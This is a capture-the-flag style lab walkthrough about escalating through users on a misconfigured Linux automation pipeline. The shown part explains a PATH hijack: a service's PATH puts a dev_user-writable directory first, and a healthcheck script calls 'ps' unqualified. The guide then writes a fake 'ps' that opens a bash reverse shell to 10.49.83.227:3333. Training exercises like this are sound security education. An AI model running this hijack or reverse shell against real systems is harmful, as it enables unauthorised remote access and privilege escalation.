### Lab Guide:

#### You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.
#### Your objective is to escalate from anonymous access all the way through:

<h3 align="center"> recon_user → dev_user → monitor_user → ops_user → root </h1>

Now we see:
````

Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin

````


Then check:
````
cat /usr/local/bin/healthcheck
````
<img width="646" height="259" alt="image" src="https://github.com/user-attachments/assets/88a3a192-26f9-43cc-991d-e08ab5cbf3e1" />


Now we see:
````
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
````
In this it calls:
````
ps aux
````
without using ``/usr/bin/ps``.

Because:
````
/opt/dev/bin
````
is first in the service's PATH and is controlled by ``dev_user``, we can supply our own ``ps``.




##### Create fake ps

````
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.49.83.227/3333 0>&1
EOF
````
